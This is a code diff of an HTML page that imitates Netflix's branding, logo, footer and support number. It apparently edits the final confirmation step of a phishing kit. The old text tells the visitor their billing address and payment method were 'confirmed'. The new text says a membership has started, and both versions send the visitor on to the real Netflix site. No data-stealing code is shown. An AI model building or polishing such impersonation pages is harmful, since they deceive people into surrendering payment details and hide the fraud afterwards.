@@ -6,30 +6,35 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="stylesheet" href="step1.css">
   <link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico"/>
-          <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css">
+      <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css">
 
   <title>Netflix</title>
   </head>
   <body>
     <div class="header">
       <svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true"><title></title><g id="netflix-logo"><path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.75L94.468 0h5.063l3.062 7.874L105.875 0h5.124l-5.937 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.53-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687h-4.844V0h14.406v4.687h-4.874zM30.75 15.593c-2.062 0-4.5 0-6.25.095v6.968c2.75-.188 5.5-.406 8.281-.5v4.5l-12.968 1.032V0H32.78v4.687H24.5V11c1.813 0 4.594-.094 6.25-.094v4.688zM4.78 12.968v16.375C3.094 29.531 1.593 29.75 0 30V0h4.469l6.093 17.032V0h4.688v28.062c-1.656.282-3.344.376-5.125.625L4.78 12.968z" id="Fill-14"></path></g></svg>
-      <div  onclick="window.location = 'index.php'">
-        DESCONNECT
+      <div  onclick="window.location = 'index.html'">
+        DISCONNECT
       </div>
     </div>
     <div class="minbody">
         <div class="pana">
           <div class="shield"></div>
-          <h1>Are you ready!</h1>
-          <p>Updated billing address.</p>
-          <p>Confirmed payment method.</p>
+          <h1>Welcome to Netflix!</h1>
+          <p>You have started your membership and we have sent you the information to your email.</p>
+          <p id="mart">Remember that you can cancel online at any time from the Account section.</p>
+        <a href="https://www.netflix.com/mx/" class="regi" style="margin-top: 50px;">NEXT</a>
         
-        <a href="https://www.netflix.com/mx/" class="regi">CHECK IN</a>
-         
         </div>
       </div>
-     
+
       <style>
+        .mart {
+          margin-bottom: 50px;
+        }
+        .regi {
+          margin-top: 20px;
+        }
         .header {
   width : 100%;
   border-bottom : 1px solid #e6e6e6;
@@ -62,16 +67,15 @@
 
 .minbody {
   padding-top: 100px;
-  text-align: center;
-  display: flex;
-  justify-content: center;
-  align-items: center;
 }
 .minbody h1{
   color: red;
 }
 .minbody p {
   padding-bottom: 10px;
+}
+.minbody #mart {
+  margin-bottom: 50px;
 }
 .minbody .regi{
   margin-top: 30px;
@@ -85,15 +89,26 @@
   background-color: red;
   color: #fff;
 }
+.pana {
+  padding: 50px;
+}
+.pana p {
+  text-align: none;
+  text-justify: inter-word;
+}
+.pana h1 {
+  color: rgba(0,0,0,0.8);
+  text-orientation: left;
+}
       </style>
-   <footer>
+      <footer>
 			<div class="paramount">
 				<div class="contenedores">
 					<p>Questions? Call 800-062-2406</p>
 					<p>Frequent questions</p>
 					<p>Cookie preferences</p>
 					<div class="lenguaje_la">
-						<a href="../exited.html">Spanish</a>
+						<a href="../index.html">Spanish</a>
 						<i class="fas fa-caret-down"></i>
 					</div>
 					
